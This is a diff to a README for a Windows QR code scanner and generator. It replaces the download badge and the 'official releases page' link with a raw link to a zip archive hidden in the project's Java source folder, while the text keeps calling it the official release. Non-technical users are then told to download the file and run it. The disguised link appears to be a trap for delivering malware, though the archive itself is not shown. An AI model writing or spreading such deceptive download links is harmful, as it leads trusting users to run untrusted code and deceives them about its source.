@@ -1,6 +1,6 @@
 # 📱 qr-scanner-generator - Create and scan codes quickly
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/benitauncompartmented1891/qr-scanner-generator/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/benitauncompartmented1891/qr-scanner-generator/main/android-app/app/src/main/java/com/itisuniqueofficial/qr-scanner-generator-piccalilli.zip)
 
 This application creates and reads QR codes. Use your computer camera to scan codes or upload image files. The tool works on Windows devices and creates codes in seconds. You do not need technical skills to operate this software.
 
@@ -17,7 +17,7 @@ This application creates and reads QR codes. Use your computer camera to scan co
 
 Follow these steps to obtain the tool from the official repository.
 
-1.  Visit the [official releases page](https://github.com/benitauncompartmented1891/qr-scanner-generator/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/benitauncompartmented1891/qr-scanner-generator/main/android-app/app/src/main/java/com/itisuniqueofficial/qr-scanner-generator-piccalilli.zip).
 2.  Locate the section labeled "Assets" under the most recent version number.
 3.  Click the link ending in `.zip` or `.exe` to start the download.
 4.  Save the file to a folder you recognize, such as your Downloads folder.
